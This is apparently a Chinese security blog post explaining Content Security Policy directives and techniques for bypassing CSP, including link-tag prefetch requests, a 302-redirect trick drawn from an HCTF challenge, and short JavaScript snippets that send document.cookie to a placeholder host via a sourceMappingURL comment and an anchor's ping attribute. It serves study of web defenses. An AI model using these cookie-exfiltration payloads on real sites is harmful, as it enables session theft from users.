---
layout:		post
title:		Bypass CSP
data:		2016-12-08
author:		"dogewatch"
header-img:	"img/post-bg-2015.jpg"
tags:
    - web
---

> Safe is depending users

# CSP

CSP:Content Security Policy(内容安全策略)，其旨在减少跨站脚本攻击。由开发者定义一些安全性的策略声明，来指定可信的内容(脚本，图片，iframe，style，font等)来源。现代浏览器可以通过http头部的`Content-Security-Policy`来获取csp配置。指令如下表：

|     指令      |              说明              |
| :---------: | :--------------------------: |
| default-src |           定义默认加载策略           |
| connect-src |    定义ajax、websocket等加载策略     |
|  font-src   |          定义font加载策略          |
|  frame-src  |         定义frame加载策略          |
|   img-src   |           定义图片加载策略           |
|  media-src  |     定义audio、video等资源加载策略     |
| object-src  | 定义applet、embed、object等资源加载策略 |
| script-src  |           定义js加载策略           |
|  style-src  |          定义css加载策略           |
|   sandbox   |             沙箱选项             |
| report-uri  |             日志选项             |

一些属性值如下表：

|        属性值         |             示例             |                    说明                    |
| :----------------: | :------------------------: | :--------------------------------------: |
|         *          |         ing-src *          | 允许从任意url加载，除了data:blob:filesystem:schemes |
|       'none'       |     object-src 'none'      |               禁止从任何url加载资源               |
|       'self'       |       img-src 'self'       |                只可以加载同源资源                 |
|       data:        |    img-src 'self' data:    |              可以通过data协议加载资源              |
| domain.example.com | ing-src domain.example.com |               只可以从特定的域加载资源               |
|   *.example.com    |   img-src *.example.com    |         可以从任意example.com的子域处加载资源         |
|  https://cdn.com   |  img-src https://cdn.com   |            只能从给定的域用https加载资源             |
|       https:       |       img-src https:       |             只能从任意域用https加载资源             |
|  'unsafe-inline'   | script-src 'unsafe-inline' | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
|   'unsafe-eval'    |  script-src 'unsafe-eval'  |        允许一些不安全的代码执行方式，例如js的eval()        |

# CSP 绕过 

虽然csp对不同的资源，不同的加载权限都能够有一个比较明确的划分，但是这并不意味着就能彻底杜绝跨站脚本漏洞，因为在正常环境中，开发者也总会用跨站加载资源或者脚本的需求。试想一下，如果csp头设置成`default-src 'none'`，固然能够杜绝xss，但是这样也没几个网站能够正常使用了吧。

## 0x1 预加载

浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。

HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有`unsafe-inline`，则用预加载的方式可以向外界发出请求，例如：

```html
<!-- 预加载某个页面 -->
<link rel='prefetch' href='http://xxxx'><!-- firefox -->
<link rel='prerender' href='http://xxxx'><!-- chrome -->
<!-- 预加载某个图片 -->
<link rel='prefetch' href='http://xxxx/x.jpg'>
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="http://xxxx">
<!-- 特定文件类型预加载 -->
<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
```

另外，不是所有的页面都能够被预加载，当资源类型如下时，讲阻止预加载操作：

1. URL中包含下载资源

2. 页面中包含音频、视频

3. POST、PUT和DELET操作的ajax请求

4. HTTP认证

5. HTTPS页面

6. 含恶意软件的页面

7. 弹窗页面

8. 占用资源很多的页面

9. 打开了chrome developer tools开发工具

## 0x2 302跳转

今年XCTF第一站杭电的HCTF里有一道题利用了302跳转来绕过CSP限制，当时并不知道这个点，所以下来之后再研究一下。

对于302跳转绕过CSP而言，实际上有以下几点限制：

1. “跳板”必须在允许的域内。

2. 要加载的文件的host部分必须跟允许的域的host部分一致，例如csp头内容是`script-src http://abc.xyz/asdf`，那么要加载的文件必须位于http://abc.xyz下，路径可以是`http://abc.xy/xxx/xx`

   举个例子，新建一个php，代码如下：

```php+HTML
<?php
  header("Content-Security-Policy: default-src 'self' script-src 'self' http://x.x.x.x/asdf);
?>
<html>
<script src="http://127.0.0.1/test/302.php?http://x.x.x.x/test/1.js">
</script>
</html>
```

然后再建一个用来跳转的php，在另一台服务器上，在test目录下建一个js我呢见，内容是`alert(1)`。结果成功弹窗：

![img](/img/post/csp-1.png)

可以试一下是不是通过跳转加载任意服务器上的文件，我们将csp头修改成`default-src 'self'`，结果如图，触发了浏览器的拦截。

![img](/img/post/csp-2.png)

由此可见，CSP规则在跳转之后路径部分的限制消失了，但是host部分的限制依然存在。适用场景就是假如某网站调用的某个外部站点可以上传文件，同时它自身又刚好有个重定向，则满足漏洞利用的条件

## 0x3 一些其他特性 

  利用javascript或者某些标签的某种特性可以绕过`unsafe-inline`向外界发出请求。

1. jQuery sourcemap

   ```javascript
   document.write(`<script>
   //@ 	   sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);
   ```

2. a标签的ping属性

   ```javascript
   a=document.createElement('a');
   a.href='#';
   a.ping='http://xxxx/?' + document.cookie;
   a.click();
   ```

3. 利用上传点，在上传的文件(如jpeg)中写javascript代码(chrome不行)。
